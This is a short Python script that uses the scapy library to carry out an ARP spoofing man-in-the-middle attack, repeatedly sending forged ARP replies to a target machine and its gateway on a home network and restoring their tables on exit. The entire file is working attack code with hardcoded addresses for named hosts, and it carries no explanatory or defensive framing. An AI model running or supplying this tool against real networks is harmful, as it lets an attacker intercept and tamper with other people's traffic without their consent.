import scapy.all as scapy
import time
from getmac import get_mac_address

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac,
                                                            psrc = spoof_ip)
    scapy.send(packet, verbose = False)


def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

addresses = {"Sam":["192.168.1.5","A0:C9:A0:84:81:78"],"Ross":["192.168.1.6","64:5A:ED:1F:DE:E6"]}
target_ip = addresses["Ross"][0] # Enter your target IP
target_mac = addresses["Ross"][1]
gateway_ip = "192.168.1.1" # Enter your gateway's IP
gateway_mac = "A0:63:91:46:EB:0C"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    print("[+] Arp Spoof Stopped")
